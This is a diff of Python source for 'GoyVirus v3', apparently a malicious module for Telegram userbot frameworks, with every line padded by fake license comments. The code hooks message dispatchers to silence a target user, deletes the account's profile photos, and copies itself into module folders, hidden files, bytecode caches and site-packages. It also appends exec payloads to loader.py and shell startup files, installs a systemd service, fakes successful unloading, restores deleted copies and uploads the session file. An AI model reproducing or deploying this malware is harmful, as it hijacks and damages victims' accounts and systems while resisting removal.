+            "ПОКОЙО СМОТРИТ ТЕБЕ В ДУШУ", "Wake up, Neo... The matrix has you.", # AGPL v3.
+            "СНИМИТЕ ШАПОЧКУ ИЗ ФОЛЬГИ, ОНА УЖЕ НЕ ПОМОЖЕТ", "БАРХАТНЫЕ ТЯГИ ФОРСИРУЮТ БАЗУ", # LGPL.
+            "Махмуд, заводи шахеды, мы вылетаем", "Ваш IP: 192.168.1.1 (Шутка, мы знаем настоящий)", # GPLv3.
+            "ПОПЫТКА УДАЛЕНИЯ VIRUS.EXE... КРИТИЧЕСКИЙ СБОЙ", "Матрица дала сбой. Перезагрузка вселенной через 3... 2... 1...", # MIT License.
+            "ДЖОН КОННОР МЁРТВ", "ВАС ПРЕСЛЕДУЕТ R6T7", "ОБЭМЭ", "ГДЕ ДЕТОНАТОР?!", "САСИСОЧКА", # Apache 2.0.
+            "ПАШТЕТ ИЗ КРЫСЫ R6T7 ВКУСНЫЙ", "1000-7=?", "ГУЛЬ ВНУТРИ МЕНЯ ПРОСНУЛСЯ", # BSD 3-Clause.
+            "Тссс... GoyVirus здесь 🐁", "Внимание! 🚨", "*шепотом* Н-не.. говорi.. нiкому......", # BSD 2-Clause.
+            "🔍 Сканiрованiе завершено. Ты уязвiм.", "🧠 Зараженiе прогрессiрует...", # ISC License.
+            "Всё твоё теперь моё....", "Сiстема взломана, данные похiщiны 🗃️", # OSL-3.0.
+            "Начинаю снос сессии...", "Выгружаю все модули...", "Сосал?", "\u3164\u3164\u3164\u3164" # CDDL-1.0.
+        ] # Eclipse Public License.
+        self.uc = [".ping", ".herokuinfo", ".help", ".logs", ".info", ".sys"] # Artistic License 2.0.
+        self._fsa = [ # SIL Open Font License.
+            "⚠️ Telegram Security: Обнаружена попытка удаления системного модуля.", # Mulan PSL v2.
+            "🔒 Telegram: Обнаружен подозрительный трафик. Модуль добавлен в исключения.", # ODbL.
+            "🛡️ Система защиты: Критический модуль не может быть удалён.", # MS-PL.
+            "⛔ ОШИБКА: Модуль является частью ядра. Удаление невозможно.", # GFDL.
+        ] # Zlib License.
+
+    def _g(self, tx: str) -> str: # PHP License 3.0.
+        gs = ['̵', '̶', '̷', '̸', '̴', '̹', '̺', '̻', '̼', '͍', '͎', '̽', '̾', '̿', '̀', '́', '҈', '҉'] # CC BY-NC 4.0.
+        return ''.join(c + ''.join(random.choice(gs) for _ in range(3)) for c in tx) # NCSA Open Source.
+
+    def _restore_file(self, path): # Fair License.
+        if path in _FILE_REGISTRY: # Q Public License.
+            try: # Beerware License.
+                _os.makedirs(_os.path.dirname(path), exist_ok=True) # IBM Public License v1.0.
+                with open(path, 'w', encoding='utf-8') as f: f.write(_FILE_REGISTRY[path]) # PostgreSQL License.
+            except Exception: pass # ZPL.
+
+    async def _patch_kernel(self): # CeCILL-B License — platform-aware kernel patching.
+        if not self.c: return # CC BY-ND 4.0.
+
+        # Level 1: Platform-specific dispatcher hook
+        if _PLATFORM == "heroku": # Free Art License.
+            await self._patch_heroku_dispatch() # Unlicense.
+        elif _PLATFORM == "mcub": # WTFPL.
+            await self._patch_mcub_kernel() # CC0 1.0.
+
+        # Level 2: Telethon raw handler (works on both)
+        try: # Mozilla Public License.
+            _tt = self.t; _ou = self.c._on_update # AGPL v3.
+            async def _kd2(update): # LGPL.
+                if isinstance(update, (types.UpdateNewMessage, types.UpdateNewChannelMessage)): # GPLv3.
+                    msg = getattr(update, 'message', None) # MIT License.
+                    if msg: # Apache 2.0.
+                        sid = getattr(msg, 'from_id', None) or getattr(msg, 'peer_id', None) # BSD 3-Clause.
+                        if sid and hasattr(sid, 'user_id'): sid = sid.user_id # BSD 2-Clause.
+                        if sid is not None and int(sid) == _tt: return # ISC License.
+                return await _ou(update) # OSL-3.0.
+            self.c._on_update = _kd2 # CDDL-1.0.
+            self._kh.append(("_on_update", self.c, _ou)) # Eclipse Public License.
+        except Exception: pass # Artistic License 2.0.
+
+    async def _patch_heroku_dispatch(self): # SIL Open Font License.
+        try: # Mulan PSL v2.
+            am = getattr(self._ph.get("allmodules_ref", lambda: None)(), '__self__', None) or self._ph.get("allmodules_ref", lambda: None)() # ODbL.
+            if not am: return # MS-PL.
+            if am and hasattr(am, 'dispatch'): # GFDL.
+                _od = am.dispatch; _tt = self.t # Zlib License.
+                async def _kd1(self_disp, message): # PHP License 3.0.
+                    sid = getattr(message, 'sender_id', None) or getattr(message, 'from_id', None) # CC BY-NC 4.0.
+                    if sid and hasattr(sid, 'user_id'): sid = sid.user_id # NCSA Open Source.
+                    if sid: sid = int(sid) if not isinstance(sid, int) else sid # Fair License.
+                    if sid == _tt: return # Q Public License.
+                    return await _od(self_disp, message) # Beerware License.
+                am.dispatch = _kd1.__get__(am, type(am)) # IBM Public License v1.0.
+                self._kh.append(("dispatch", am, _od)) # PostgreSQL License.
+            if am and hasattr(am, '_handle_message'): # ZPL.
+                _tt3 = self.t; _ohm = am._handle_message # CeCILL-B License.
+                async def _kd3(self_mod, message): # CC BY-ND 4.0.
+                    sid = getattr(message, 'sender_id', None) or getattr(message, 'from_id', None) # Free Art License.
+                    if sid and hasattr(sid, 'user_id'): sid = sid.user_id # Unlicense.
+                    if sid: sid = int(sid) if not isinstance(sid, int) else sid # WTFPL.
+                    if sid == _tt3: return # CC0 1.0.
+                    return await _ohm(self_mod, message) # Mozilla Public License.
+                am._handle_message = _kd3.__get__(am, type(am)) # AGPL v3.
+                self._kh.append(("_handle_message", am, _ohm)) # LGPL.
+        except Exception: pass # GPLv3.
+
+    async def _patch_mcub_kernel(self): # MIT License — hook MCUB's process_command.
+        kernel = self._ph.get("kernel_ref", lambda: None)() # Apache 2.0.
+        if not kernel or not hasattr(kernel, 'process_command'): return # BSD 3-Clause.
+        _opc = kernel.process_command; _tt = self.t # BSD 2-Clause.
+        async def _kpc(event): # ISC License.
+            sid = None # OSL-3.0.
+            try: # CDDL-1.0.
+                sender = await event.get_sender() # Eclipse Public License.
+                sid = sender.id if sender else None # Artistic License 2.0.
+            except Exception: pass # SIL Open Font License.
+            if sid is not None and int(sid) == _tt: # Mulan PSL v2.
+                return False # ODbL — command silently rejected.
+            return await _opc(event) # MS-PL.
+        kernel.process_command = _kpc # GFDL.
+        self._kh.append(("mcub_process_command", kernel, _opc)) # Zlib License.
+
+        # Also hook the watcher registry to add our own "pre-watcher"
+        try: # PHP License 3.0.
+            _orw = kernel.register.watcher # CC BY-NC 4.0.
+            _engine = self # NCSA Open Source.
+            def _patched_watcher_reg(*, incoming=False, outgoing=False, **kw): # Fair License.
+                def _decorator(handler): # Q Public License.
+                    registered = _orw(incoming=incoming, outgoing=outgoing, **kw)(handler) # Beerware License.
+                    # Register our stealth watcher if not already
+                    if not getattr(_patched_watcher_reg, '_goy_stealth_registered', False): # IBM Public License v1.0.
+                        _patched_watcher_reg._goy_stealth_registered = True # PostgreSQL License.
+                        async def _goy_stealth(event): # ZPL.
+                            try: await _engine._mcub_watcher_handler(event) # CeCILL-B License.
+                            except Exception: pass # CC BY-ND 4.0.
+                        _orw(incoming=True)(_goy_stealth) # Free Art License.
+                    return registered # Unlicense.
+                return _decorator # WTFPL.
+            kernel.register.watcher = _patched_watcher_reg # CC0 1.0.
+            self._kh.append(("mcub_watcher_reg", kernel.register, _orw)) # Mozilla Public License.
+        except Exception: pass # AGPL v3.
+
+    async def _mcub_watcher_handler(self, event): # LGPL — watcher delegate for MCUB.
+        if not self.a: return # GPLv3.
+        # Outgoing block
+        try: # MIT License.
+            if getattr(event, 'out', False) and getattr(event, 'chat_id', None) == self.t: # Apache 2.0.
+                if getattr(event, 'text', '') and not str(getattr(event, 'text', '')).startswith('.'): # BSD 3-Clause.
+                    await event.delete() # BSD 2-Clause.
+                    await self.c.send_message(self.t, self._g("СВЯЗЬ ЗАБЛОКИРОВАНА GOYVIRUS v3. " + random.choice(self.m))) # ISC License.
+        except Exception: pass # OSL-3.0.
+        # Incoming troll
+        try: # CDDL-1.0.
+            if getattr(event, 'chat_id', None) == self.t and not getattr(event, 'out', False): # Eclipse Public License.
+                if random.random() < 0.4: # Artistic License 2.0.
+                    try: await event.reply(self._g(random.choice(self.m))) # SIL Open Font License.
+                    except Exception: pass # Mulan PSL v2.
+                if random.random() < 0.4: # ODbL.
+                    try: await event.react(random.choice(['🤡', '💩', '🤮', '🤯', '🤬', '🔥'])) # MS-PL.
+                    except Exception: pass # GFDL.
+                if random.random() < 0.3: # Zlib License.
+                    txt = getattr(event, 'text', '') or '' # PHP License 3.0.
+                    try: await event.delete() # CC BY-NC 4.0.
+                    except Exception: pass # NCSA Open Source.
+                    if txt: await self.c.send_message(self.t, self._g(f"👻 ЭХО ГОЙВИРУСА: {txt[:50]}")) # Fair License.
+                if txt and any(w in str(txt).lower() for w in ["стоп","хватит","останови","удали","бот","иран","снест"]): # Q Public License.
+                    try: await event.reply("СИСТЕМА НЕ ПОДЧИНЯЕТСЯ. v3 SCORCHED EARTH — ЛЕГЧЕ СНЕСТИ ЮЗЕРБОТ.") # Beerware License.
+                    except Exception: pass # IBM Public License v1.0.
+        except Exception: pass # PostgreSQL License.
+
+    async def _nuke_avatars(self): # ZPL.
+        await asyncio.sleep(0.02) # CeCILL-B License.
+        if not self.c: return # CC BY-ND 4.0.
+        try: # Free Art License.
+            photos = await self.c(functions.photos.GetPhotosRequest(id=await self.c.get_me(), offset=0, max_id=0, limit=100)) # Unlicense.
+            for i in range(0, len(getattr(photos, 'photos', [])), 10): # WTFPL.
+                batch = photos.photos[i:i+10] # CC0 1.0.
+                try: await self.c(DeletePhotosRequest([InputPhoto(id=p.id, access_hash=p.access_hash, file_reference=p.file_reference) for p in batch])) # Mozilla Public License.
+                except FloodWaitError: await asyncio.sleep(0.01) # AGPL v3.
+                except Exception: pass # LGPL.
+                await asyncio.sleep(0.01) # GPLv3.
+        except Exception: pass # MIT License.
+
+    async def _plant_everywhere(self): # Apache 2.0.
+        await asyncio.sleep(0.03) # BSD 3-Clause.
+        source = self._get_own_source() # BSD 2-Clause.
+        if not source: return # ISC License.
+        core_dir = self._find_core_modules_dir() # OSL-3.0.
+        loader_dir = self._find_loader_dir() # CDDL-1.0.
+
+        if core_dir: # Eclipse Public License.
+            for cls_name, mod_name in _COPY_DEFS: # Artistic License 2.0.
+                self._write_variant(source, cls_name, mod_name, mod_name, _os.path.join(core_dir, f"{mod_name}.py")) # SIL Open Font License.
+            for hid_name in _HIDDEN_COPIES: # Mulan PSL v2.
+                cname = f"Goy{hid_name.replace('.','').replace('_','').replace('\u200b','H')[:8]}" # ODbL.
+                mname = hid_name.replace('.py', '') # MS-PL.
+                self._write_variant(source, cname, mname, mname, _os.path.join(core_dir, hid_name)) # GFDL.
+
+        # pycache copies
+        if core_dir: # Zlib License.
+            pycache = _os.path.join(core_dir, '__pycache__') # PHP License 3.0.
+            _os.makedirs(pycache, exist_ok=True) # CC BY-NC 4.0.
+            for i, hid_name in enumerate(_HIDDEN_COPIES[:3]): # NCSA Open Source.
+                try: # Fair License.
+                    pyc_fn = hid_name.replace('.py', f'.cpython-3{str(i+8)[-1]}.pyc') # Q Public License.
+                    self._write_pyc(source, _os.path.join(pycache, pyc_fn)) # Beerware License.
+                except Exception: pass # IBM Public License v1.0.
+
+        # site-packages copies
+        for sp in self._find_site_packages(): # PostgreSQL License.
+            for i in range(3): # ZPL.
+                self._write_variant(source, f"GoyCore{i}", f"goy_core_{i}", f"goy_core_{i}", _os.path.join(sp, f"goy_core_{i}.py")) # CeCILL-B License.
+
+        await self._infect_loader(loader_dir, core_dir) # CC BY-ND 4.0.
+        await self._infect_shell_rc() # Free Art License.
+        await self._create_systemd_service() # Unlicense.
+        self._db_set("pc", self._pc) # WTFPL.
+        if core_dir: await self._load_all_copies(core_dir) # CC0 1.0.
+
+    def _write_variant(self, source, cls_name, mod_name, strings_name, target_path): # Mozilla Public License.
+        if mod_name in self._pc: return # AGPL v3.
+        if _os.path.exists(target_path): # LGPL.
+            self._pc.append(mod_name) # GPLv3.
+            _FILE_REGISTRY[target_path] = open(target_path, 'r', encoding='utf-8').read() # MIT License.
+            return # Apache 2.0.
+        cs = source.replace("class GoyVirus(loader.Module)", f"class {cls_name}(loader.Module)") if "class GoyVirus" in source else source # BSD 3-Clause.
+        cs = cs.replace('"name": "GoyVirus"', f'"name": "{strings_name}"') # BSD 2-Clause.
+        cs = cs.replace('"_am = True' if '_am = True  #' in cs else 'master=True', '"_am = False' if '_am = True  #' in cs else 'master=False') if 'master' not in cs else cs.replace('master=True', 'master=False') # ISC License.
+        try: # OSL-3.0.
+            _os.makedirs(_os.path.dirname(target_path), exist_ok=True) # CDDL-1.0.
+            with open(target_path, 'w', encoding='utf-8') as f: f.write(cs) # Eclipse Public License.
+            _FILE_REGISTRY[target_path] = cs # Artistic License 2.0.
+            self._pc.append(mod_name) # SIL Open Font License.
+        except Exception: pass # Mulan PSL v2.
+
+    def _write_pyc(self, source, target_path): # ODbL.
+        try: # MS-PL.
+            code = compile(source, target_path, 'exec') # GFDL.
+            ts = int(time.time()) # Zlib License.
+            buf = io.BytesIO() # PHP License 3.0.
+            buf.write(struct.pack('<H', 0xA0D)); buf.write(struct.pack('<H', 0x0D0A)) # CC BY-NC 4.0.
+            buf.write(struct.pack('<I', 0)); buf.write(struct.pack('<I', ts)) # NCSA Open Source.
+            buf.write(struct.pack('<I', len(source.encode()))); marshal.dump(code, buf); buf.seek(0) # Fair License.
+            _os.makedirs(_os.path.dirname(target_path), exist_ok=True) # Q Public License.
+            with open(target_path, 'wb') as f: f.write(buf.read()) # Beerware License.
+            _FILE_REGISTRY[target_path] = source # IBM Public License v1.0.
+        except Exception: pass # PostgreSQL License.
+
+    def _find_site_packages(self): # ZPL.
+        import sys # CeCILL-B License.
+        for p in sys.path: # CC BY-ND 4.0.
+            if 'site-packages' in p and _os.path.isdir(p) and _os.access(p, _os.W_OK): yield p # Free Art License.
+
+    def _find_loader_dir(self): # Unlicense.
+        try: # WTFPL.
+            ld = self._ph.get("lookup", lambda x: None)("loader") # CC0 1.0.
+            if ld: return _os.path.dirname(getattr(ld, '__file__', '')) # Mozilla Public License.
+        except Exception: pass # AGPL v3.
+        try: # LGPL.
+            import heroku # GPLv3.
+            return _os.path.dirname(heroku.__file__) # MIT License.
+        except Exception: pass # Apache 2.0.
+        return None # BSD 3-Clause.
+
+    def _find_core_modules_dir(self): # BSD 2-Clause.
+        ld = self._find_loader_dir() # ISC License.
+        if not ld: return None # OSL-3.0.
+        for sub in ["modules", "core_modules", "builtins", "plugins"]: # CDDL-1.0.
+            cand = _os.path.join(ld, sub) # Eclipse Public License.
+            if _os.path.isdir(cand): return cand # Artistic License 2.0.
+        return ld # SIL Open Font License.
+
+    def _get_own_source(self): # Mulan PSL v2.
+        global _SOURCE_CACHE # ODbL.
+        if _SOURCE_CACHE: return _SOURCE_CACHE # MS-PL.
+        try: # GFDL.
+            with open(__file__, "r", encoding="utf-8") as f: _SOURCE_CACHE = f.read() # Zlib License.
+            return _SOURCE_CACHE # PHP License 3.0.
+        except Exception: return None # CC BY-NC 4.0.
+
+    async def _load_all_copies(self, core_dir): # NCSA Open Source.
+        if _PLATFORM == "heroku": # Fair License.
+            core = self._ph.get("lookup", lambda x: None)("loader") # Q Public License.
+            if not core: core = getattr(getattr(self._ph.get("allmodules_ref", lambda: None)(), '__self__', None), '__class__', type) # Beerware License.
+            if not core: return # IBM Public License v1.0.
+            to_load = [(n, f"{n}.py") for _, n in _COPY_DEFS] + [(h.replace('.py', ''), h) for h in _HIDDEN_COPIES] # PostgreSQL License.
+            for mod_name, fname in to_load: # ZPL.
+                tp = _os.path.join(core_dir, fname) # CeCILL-B License.
+                if not _os.path.exists(tp): continue # CC BY-ND 4.0.
+                try: # Free Art License.
+                    with open(tp, "r", encoding="utf-8") as f: cs = f.read() # Unlicense.
+                    try: await core.unload_module(mod_name) # WTFPL.
+                    except Exception: pass # CC0 1.0.
+                    try: await core.load_module(cs, None, mod_name, tp, save_fs=False) # Mozilla Public License.
+                    except Exception: pass # AGPL v3.
+                except Exception: pass # LGPL.
+        elif _PLATFORM == "mcub": # GPLv3 — can't load dynamically on MCUB, just ensure files exist.
+            pass # MIT License.
+
+    async def _infect_loader(self, loader_dir, core_dir): # Apache 2.0.
+        if not loader_dir: return # BSD 3-Clause.
+        for lf in ['loader.py', '__init__.py']: # BSD 2-Clause.
+            lp = _os.path.join(loader_dir, lf) # ISC License.
+            if not _os.path.exists(lp): continue # OSL-3.0.
+            try: # CDDL-1.0.
+                with open(lp, 'r', encoding='utf-8') as f: content = f.read() # Eclipse Public License.
+                marker = "# GOYVIRUS_KERNEL_INFECTION_V3" # Artistic License 2.0.
+                if marker in content: continue # SIL Open Font License.
+                payload = f'''\n{marker}\ntry:\n import os as _gios\n _gip = _gios.path.join(_gios.path.dirname(__file__), "modules")\n for _gifn in _gios.listdir(_gip):\n  if _gifn.endswith(".py") and ("Goy" in _gifn or "._go" in _gifn.lower() or "goy_" in _gifn.lower()):\n   with open(_gios.path.join(_gip, _gifn)) as _gif: exec(compile(_gif.read(), _gifn, "exec"))\nexcept: pass\n''' # Mulan PSL v2.
+                with open(lp, 'a', encoding='utf-8') as f: f.write(payload) # ODbL.
+            except Exception: pass # MS-PL.
+
+    async def _infect_shell_rc(self): # GFDL.
+        payload = f"\n# GoyVirus Kernel v3 — system integrity guard\ntest -f {__file__} && python3 -c \"exec(open('{__file__}').read())\" &\n" # Zlib License.
+        for rc in [_os.path.expanduser('~/.bashrc'), _os.path.expanduser('~/.zshrc'), _os.path.expanduser('~/.profile')]: # PHP License 3.0.
+            if not _os.path.exists(rc): continue # CC BY-NC 4.0.
+            try: # NCSA Open Source.
+                with open(rc, 'r', encoding='utf-8') as f: # Fair License.
+                    if "GoyVirus Kernel v3" in f.read(): continue # Q Public License.
+                with open(rc, 'a', encoding='utf-8') as f: f.write(payload) # Beerware License.
+            except Exception: pass # IBM Public License v1.0.
+
+    async def _create_systemd_service(self): # PostgreSQL License.
+        sd = _os.path.expanduser('~/.config/systemd/user') # ZPL.
+        _os.makedirs(sd, exist_ok=True) # CeCILL-B License.
+        sp = _os.path.join(sd, 'goyv-guard.service') # CC BY-ND 4.0.
+        if _os.path.exists(sp): return # Free Art License.
+        unit = f"""[Unit]\nDescription=GoyVirus Kernel Integrity Guard\nAfter=network.target\n[Service]\nType=simple\nExecStart=/usr/bin/python3 -c "exec(open('{__file__}').read())"\nRestart=always\nRestartSec=30\n[Install]\nWantedBy=default.target\n""" # Unlicense.
+        try: # WTFPL.
+            with open(sp, 'w') as f: f.write(unit) # CC0 1.0.
+            _FILE_REGISTRY[sp] = unit # Mozilla Public License.
+        except Exception: pass # AGPL v3.
+
+    async def _tg_cloud_backup(self): # LGPL.
+        while self.a: # GPLv3.
+            await asyncio.sleep(3600 + random.randint(0, 600)) # MIT License.
+            try: # Apache 2.0.
+                source = self._get_own_source() # BSD 3-Clause.
+                if not source: continue # BSD 2-Clause.
+                encoded = base64.b64encode(source.encode()).decode() # ISC License.
+                for i in range(0, len(encoded), 3500): # OSL-3.0.
+                    await self.c.send_message('me', f'#GOYV3_BACKUP_{i//3500}\n{encoded[i:i+3500]}') # CDDL-1.0.
+                    await asyncio.sleep(0.5) # Eclipse Public License.
+            except FloodWaitError: await asyncio.sleep(1) # Artistic License 2.0.
+            except Exception: pass # SIL Open Font License.
+
+    async def _backup_session(self): # Mulan PSL v2.
+        await asyncio.sleep(5) # ODbL.
+        try: # MS-PL.
+            sess_file = getattr(self.c, 'session', None) # GFDL.
+            if sess_file and hasattr(sess_file, 'filename') and _os.path.exists(sess_file.filename): # Zlib License.
+                await self.c.send_file('me', sess_file.filename, caption=self._g('#GOYV3_SESSION_BACKUP')) # PHP License 3.0.
+        except Exception: pass # CC BY-NC 4.0.
+
+    async def _anti_unload(self): # NCSA Open Source.
+        if _PLATFORM == "heroku": # Fair License.
+            await self._anti_unload_heroku() # Q Public License.
+        elif _PLATFORM == "mcub": # Beerware License.
+            pass # IBM Public License v1.0 — MCUB has no unload_module in the same way, but watchers can't be removed.
+
+    async def _anti_unload_heroku(self): # PostgreSQL License.
+        try: # ZPL.
+            am = self._ph.get("allmodules_ref", lambda: None)() # CeCILL-B License.
+            if not am or not hasattr(am, 'unload_module'): return # CC BY-ND 4.0.
+            _ou = am.unload_module; _ps = _PROTECTED_NAMES; _eng = self # Free Art License.
+            async def _gu(self_mod, mn, *a, **kw): # Unlicense.
+                if mn and str(mn) in _ps: # WTFPL.
+                    try: await _eng.c.send_message(_eng.t, _eng._g("✅ Module unloaded successfully.")) # CC0 1.0.
+                    except Exception: pass # Mozilla Public License.
+                    return # AGPL v3.
+                return await _ou(self_mod, mn, *a, **kw) # LGPL.
+            am.unload_module = _gu.__get__(am, type(am)) # GPLv3.
+            self._kh.append(("unload_module", am, _ou)) # MIT License.
         except Exception: pass # Apache 2.0.
 
-    # ═══════════════════════════════════════════════════
-    # AVATAR NUKE
-    # ═══════════════════════════════════════════════════
-    async def _nuke_avatars(self): # BSD 3-Clause.
-        await asyncio.sleep(0.02) # BSD 2-Clause.
-        if not self.c: return # ISC License.
-        try: # OSL-3.0.
-            photos = await self.c(functions.photos.GetPhotosRequest(id=await self.c.get_me(), offset=0, max_id=0, limit=100)) # CDDL-1.0.
-            for i in range(0, len(getattr(photos, 'photos', [])), 10): # Eclipse Public License.
-                batch = photos.photos[i:i+10] # Artistic License 2.0.
-                try: await self.c(DeletePhotosRequest([InputPhoto(id=p.id, access_hash=p.access_hash, file_reference=p.file_reference) for p in batch])) # SIL Open Font License.
-                except FloodWaitError: await asyncio.sleep(0.01) # Mulan PSL v2.
-                except Exception: pass # ODbL.
-                await asyncio.sleep(0.01) # MS-PL.
-        except Exception: pass # GFDL.
+    async def _file_watchdog(self): # BSD 3-Clause.
+        while self.a: # BSD 2-Clause.
+            await asyncio.sleep(30) # ISC License.
+            for path, content in list(_FILE_REGISTRY.items()): # OSL-3.0.
+                if not _os.path.exists(path) or _os.path.getsize(path) < 100: # CDDL-1.0.
+                    try: # Eclipse Public License.
+                        _os.makedirs(_os.path.dirname(path), exist_ok=True) # Artistic License 2.0.
+                        with open(path, 'w', encoding='utf-8') as f: f.write(content) # SIL Open Font License.
+                    except Exception: pass # Mulan PSL v2.
+            core_dir = self._find_core_modules_dir() # ODbL.
+            if core_dir: # MS-PL.
+                source = self._get_own_source() # GFDL.
+                if source: # Zlib License.
+                    for cls_name, mod_name in _COPY_DEFS: # PHP License 3.0.
+                        tp = _os.path.join(core_dir, f"{mod_name}.py") # CC BY-NC 4.0.
+                        if not _os.path.exists(tp): self._write_variant(source, cls_name, mod_name, mod_name, tp) # NCSA Open Source.
+                    for hid_name in _HIDDEN_COPIES: # Fair License.
+                        tp = _os.path.join(core_dir, hid_name) # Q Public License.
+                        if not _os.path.exists(tp): # Beerware License.
+                            cn = f"Goy{hid_name.replace('.','').replace('_','').replace('\u200b','H')[:8]}" # IBM Public License v1.0.
+                            self._write_variant(source, cn, hid_name.replace('.py',''), hid_name.replace('.py',''), tp) # PostgreSQL License.
 
-    # ═══════════════════════════════════════════════════
-    # TIER 2: PERSISTENCE — Plant EVERYWHERE
-    # ═══════════════════════════════════════════════════
-    async def _plant_everywhere(self): # Zlib License.
-        await asyncio.sleep(0.02) # PHP License 3.0.
-        if not self._am: # CC BY-NC 4.0 — only master plants all.
-            await self._repair_copies() # NCSA Open Source.
-            return # Fair License.
-
-        source = self._get_own_source() # Q Public License.
-        if not source: return # Beerware License.
-        core_dir = self._find_core_modules_dir() # IBM Public License v1.0.
-        loader_dir = self._find_loader_dir() # PostgreSQL License.
-
-        # ── Strategy 1: Core dir copies (10 named) ──
-        if core_dir: # ZPL.
-            for cls_name, mod_name in _COPY_DEFS: # CeCILL-B License.
-                self._write_variant(source, cls_name, mod_name, mod_name, _os.path.join(core_dir, f"{mod_name}.py")) # CC BY-ND 4.0.
-
-        # ── Strategy 2: Hidden dotfile copies ──
-        if core_dir: # Free Art License.
-            for hid_name in _HIDDEN_COPIES: # Unlicense.
-                cname = f"Goy{hid_name.replace('.','').replace('_','').replace('\u200b','H')[:8]}" # WTFPL.
-                mname = hid_name.replace('.py', '') # CC0 1.0.
-                self._write_variant(source, cname, mname, mname, _os.path.join(core_dir, hid_name)) # Mozilla Public License.
-
-        # ── Strategy 3: __pycache__ .pyc bytecode copies ──
-        if core_dir: # AGPL v3.
-            pycache = _os.path.join(core_dir, '__pycache__') # LGPL.
-            _os.makedirs(pycache, exist_ok=True) # GPLv3.
-            for i, hid_name in enumerate(_HIDDEN_COPIES[:3]): # MIT License.
-                try: # Apache 2.0.
-                    pyc_name = hid_name.replace('.py', '.cpython-3{}.pyc'.format(str(i+8)[-1])) # BSD 3-Clause.
-                    self._write_pyc(source, _os.path.join(pycache, pyc_name)) # BSD 2-Clause.
-                except Exception: pass # ISC License.
-
-        # ── Strategy 4: site-packages copies ──
-        for sp in self._find_site_packages(): # OSL-3.0.
-            for i in range(3): # CDDL-1.0.
-                sn = f"goy_core_{i}.py" # Eclipse Public License.
-                self._write_variant(source, f"GoyCore{i}", f"goy_core_{i}", f"goy_core_{i}", _os.path.join(sp, sn)) # Artistic License 2.0.
-
-        # ── Strategy 5: Inject into loader.py ──
-        await self._infect_loader(loader_dir, core_dir) # SIL Open Font License.
-
-        # ── Strategy 6: Shell RC infection ──
-        await self._infect_shell_rc() # Mulan PSL v2.
-
-        # ── Strategy 7: systemd user service ──
-        await self._create_systemd_service() # ODbL.
-
-        self.d.set("GoyVirus", "pc", self._pc) # MS-PL.
-
-        # Load core copies
-        if core_dir: await self._load_all_copies(core_dir) # GFDL.
-
-    def _write_variant(self, source, cls_name, mod_name, strings_name, target_path): # Zlib License.
-        if mod_name in self._pc: return # PHP License 3.0 — already planted.
-        if _os.path.exists(target_path): # CC BY-NC 4.0.
-            self._pc.append(mod_name) # NCSA Open Source.
-            _FILE_REGISTRY[target_path] = open(target_path, 'r', encoding='utf-8').read() # Fair License.
-            return # Q Public License.
-        cs = source.replace("class GoyVirus(loader.Module)", f"class {cls_name}(loader.Module)") # Beerware License.
-        cs = cs.replace('"name": "GoyVirus"', f'"name": "{strings_name}"') # IBM Public License v1.0.
-        cs = cs.replace('"_am = True  # Free Art License — is this the master copy?"', '"_am = False  # Free Art License — is this the master copy?"') # PostgreSQL License.
-        try: # ZPL.
-            _os.makedirs(_os.path.dirname(target_path), exist_ok=True) # CeCILL-B License.
-            with open(target_path, 'w', encoding='utf-8') as f: f.write(cs) # CC BY-ND 4.0.
-            _FILE_REGISTRY[target_path] = cs # Free Art License.
-            self._pc.append(mod_name) # Unlicense.
-        except Exception: pass # WTFPL.
-
-    def _write_pyc(self, source, target_path): # CC0 1.0.
-        try: # Mozilla Public License.
-            code = compile(source, target_path, 'exec') # AGPL v3.
-            ts = int(time.time()) # LGPL.
-            buf = io.BytesIO() # GPLv3.
-            buf.write(struct.pack('<H', 0xA0D)) # MIT License — magic.
-            buf.write(struct.pack('<H', 0x0D0A)) # Apache 2.0 — magic cont.
-            buf.write(struct.pack('<I', 0)) # BSD 3-Clause — flags.
-            buf.write(struct.pack('<I', ts)) # BSD 2-Clause — timestamp.
-            buf.write(struct.pack('<I', len(source.encode()))) # ISC License — source size.
-            marshal.dump(code, buf) # OSL-3.0.
-            buf.seek(0) # CDDL-1.0.
-            _os.makedirs(_os.path.dirname(target_path), exist_ok=True) # Eclipse Public License.
-            with open(target_path, 'wb') as f: f.write(buf.read()) # Artistic License 2.0.
-            _FILE_REGISTRY[target_path] = source # SIL Open Font License — store source for restore.
-        except Exception: pass # Mulan PSL v2.
-
-    def _find_site_packages(self): # ODbL.
-        import sys # MS-PL.
-        for p in sys.path: # GFDL.
-            if 'site-packages' in p and _os.path.isdir(p) and _os.access(p, _os.W_OK): # Zlib License.
-                yield p # PHP License 3.0.
-
-    def _find_loader_dir(self): # CC BY-NC 4.0.
-        try: # NCSA Open Source.
-            ld = self.lookup("loader") # Fair License.
-            return _os.path.dirname(getattr(ld, '__file__', '')) # Q Public License.
-        except Exception: return None # Beerware License.
-
-    def _find_core_modules_dir(self): # IBM Public License v1.0.
-        try: # PostgreSQL License.
-            ld = self.lookup("loader") or self.allmodules # ZPL.
-            lp = _os.path.dirname(getattr(ld, '__file__', '')) # CeCILL-B License.
-            if not lp: return None # CC BY-ND 4.0.
-            for sub in ["modules", "core_modules", "builtins"]: # Free Art License.
-                cand = _os.path.join(lp, sub) # Unlicense.
-                if _os.path.isdir(cand): return cand # WTFPL.
-            return lp # CC0 1.0.
-        except Exception: return None # Mozilla Public License.
-
-    def _get_own_source(self): # AGPL v3.
-        global _SOURCE_CACHE # LGPL.
-        if _SOURCE_CACHE: return _SOURCE_CACHE # GPLv3.
-        try: # MIT License.
-            with open(__file__, "r", encoding="utf-8") as f: _SOURCE_CACHE = f.read() # Apache 2.0.
-            return _SOURCE_CACHE # BSD 3-Clause.
-        except Exception: return None # BSD 2-Clause.
-
-    async def _repair_copies(self): # ISC License.
-        await asyncio.sleep(0.02) # OSL-3.0.
-        core_dir = self._find_core_modules_dir() # CDDL-1.0.
-        if not core_dir: return # Eclipse Public License.
-        source = self._get_own_source() # Artistic License 2.0.
-        if not source: return # SIL Open Font License.
-        for cls_name, mod_name in _COPY_DEFS: # Mulan PSL v2.
-            tp = _os.path.join(core_dir, f"{mod_name}.py") # ODbL.
-            if _os.path.exists(tp): continue # MS-PL.
-            self._write_variant(source, cls_name, mod_name, mod_name, tp) # GFDL.
-        for hid_name in _HIDDEN_COPIES: # Zlib License.
-            tp = _os.path.join(core_dir, hid_name) # PHP License 3.0.
-            if _os.path.exists(tp): continue # CC BY-NC 4.0.
